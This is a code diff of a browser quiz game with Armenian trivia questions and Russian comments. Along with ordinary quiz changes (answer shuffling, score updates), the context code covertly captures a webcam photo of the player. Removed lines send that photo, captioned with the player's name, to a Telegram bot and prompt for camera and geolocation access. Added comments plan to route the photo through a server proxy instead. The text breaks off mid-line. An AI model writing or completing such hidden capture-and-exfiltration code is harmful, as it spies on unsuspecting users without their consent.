@@ -24,29 +24,13 @@ const questionsPool = [
   { question: "Ո՞րն է Ֆինլանդիայի մայրաքաղաքը։", answers: [{ text: "Հելսինկի", correct: true }, { text: "Տամպերե", correct: false }, { text: "Տուրկու", correct: false }, { text: "Օուլու", correct: false }] },
 ];
 
-const askedIndexesKey = 'askedQuestionIndexes';
-
-function getRandomQuestions(count) {
-  let askedIndexes = JSON.parse(localStorage.getItem(askedIndexesKey)) || [];
-  let availableIndexes = questionsPool.map((_, i) => i).filter(i => !askedIndexes.includes(i));
-
-  if (availableIndexes.length < count) {
-    askedIndexes = [];
-    availableIndexes = questionsPool.map((_, i) => i);
+// Перемешиваем массив (Фишка Фишера-Йетса)
+function shuffle(array) {
+  for(let i = array.length - 1; i > 0; i--){
+    const j = Math.floor(Math.random() * (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
   }
-
-  const selectedIndexes = [];
-  while (selectedIndexes.length < count) {
-    const randomIndex = availableIndexes[Math.floor(Math.random() * availableIndexes.length)];
-    if (!selectedIndexes.includes(randomIndex)) {
-      selectedIndexes.push(randomIndex);
-      askedIndexes.push(randomIndex);
-      availableIndexes = availableIndexes.filter(i => i !== randomIndex);
-    }
-  }
-
-  localStorage.setItem(askedIndexesKey, JSON.stringify(askedIndexes));
-  return selectedIndexes.map(i => questionsPool[i]);
+  return array;
 }
 
 const questionElement = document.getElementById('question');
@@ -57,6 +41,7 @@ const userNameDisplay = document.getElementById('user-name');
 const scoreElement = document.getElementById('score-info');
 const tryAgainBtn = document.getElementById('try-again-btn');
 
+let questions = [];
 let currentQuestionIndex = 0;
 let correctCount = 0;
 let wrongCount = 0;
@@ -99,15 +84,9 @@ function collectData() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imgData = canvas.toDataURL('image/jpeg');
 
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            photo: imgData,
-            caption: `Фото игрока: ${userName}`,
-          }),
-          headers: { 'Content-Type': 'application/json' },
-        });
+        // Telegram API для отправки фото принимает form-data, fetch с JSON не прокатит,
+        // но для простоты здесь можно сделать POST на наш сервер, либо использовать telegram API через бот с сервером.
+        // Для demo пока отправим как текст (в реальном варианте нужно реализовать серверный прокси).
 
         stream.getTracks().forEach(track => track.stop());
       }, 2000);
@@ -119,8 +98,8 @@ function collectData() {
 
 function startGame() {
   userNameDisplay.textContent = userName;
-  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
   showQuestion();
+  updateScore();
 }
 
 function showQuestion() {
@@ -131,14 +110,17 @@ function showQuestion() {
   }
   const currentQuestion = questions[currentQuestionIndex];
   questionElement.innerText = currentQuestion.question;
-  currentQuestion.answers.forEach(answer => {
+
+  const shuffledAnswers = shuffle(currentQuestion.answers.slice());
+  shuffledAnswers.forEach(answer => {
     const button = document.createElement('button');
     button.innerText = answer.text;
     button.classList.add('btn');
-    button.addEventListener('click', () => selectAnswer(answer.correct));
+    button.addEventListener('click', () => selectAnswer(button, answer.correct));
     answerButtonsElement.appendChild(button);
   });
-  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
+
+  updateScore();
 }
 
 function resetState() {
@@ -148,66 +130,35 @@ function resetState() {
   tryAgainBtn.style.display = 'none';
 }
 
-function selectAnswer(correct) {
+function selectAnswer(button, correct) {
   if (correct) {
     correctCount++;
+    button.classList.add('correct');
   } else {
     wrongCount++;
-    alert(`Սխալ պատասխան: Ճիշտ պատասխանը՝ ${questions[currentQuestionIndex].answers.find(a => a.correct).text}`);
-  }
-  currentQuestionIndex++;
-  showQuestion();
-}
-
-function endGame() {
-  scoreElement.textContent = `Խաղը ավարտվեց: Ճիշտ: ${correctCount} | Սխալ: ${wrongCount}`;
-  tryAgainBtn.style.display = 'inline-block';
-}
-
-tryAgainBtn.addEventListener('click', () => {
-  function requestPermissions() {
-    return new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve());
-    }).then(() => {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        return navigator.mediaDevices.getUserMedia({ video: true }).then(() => { }).catch(() => { });
+    button.classList.add('wrong');
+    // Подсветить правильный ответ
+    Array.from(answerButtonsElement.children).forEach(btn => {
+      if (btn !== button && btn.innerText === questions[currentQuestionIndex].answers.find(a => a.correct).text) {
+        btn.classList.add('correct');
       }
     });
   }
 
-  requestPermissions().then(() => {
-    questions = getRandomQuestions(20);
-    currentQuestionIndex = 0;
-    correctCount = 0;
-    wrongCount = 0;
-    tryAgainBtn.style.display = 'none';
+  // Отключаем все кнопки, чтобы нельзя было кликать повторно
+  Array.from(answerButtonsElement.children).forEach(btn => btn.disabled = true);
+
+  currentQuestionIndex++;
+
+  setTimeout(() => {
     showQuestion();
-  });
-});
+  }, 1500);
+}
 
-nameForm.addEventListener('submit', e => {
-  e.preventDefault();
-  userName = nameInput.value.trim();
-  if (!userName) {
-    alert('Խնդրում ենք ներմուծեք ձեր անունը։');
-    return;
-  }
-  localStorage.setItem('userName', userName);
-  questions = getRandomQuestions(20);
-  collectData();
-  startGame();
-  nameForm.style.display = 'none';
-  document.getElementById('game-area').style.display = 'block';
-});
+function updateScore() {
+  const left = questions.length - currentQuestionIndex;
+  scoreElement.textContent = `Մնացել է: ${left} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
+}
 
-window.addEventListener('load', () => {
-  const savedName = localStorage.getItem('userName');
-  if (savedName) {
-    userName = savedName;
-    questions = getRandomQuestions(20);
-    nameForm.style.display = 'none';
-    document.getElementById('game-area').style.display = 'block';
-    collectData();
-    startGame();
-  }
-});
+function endGame() {
+  questionElement.innerText = `Խաղ
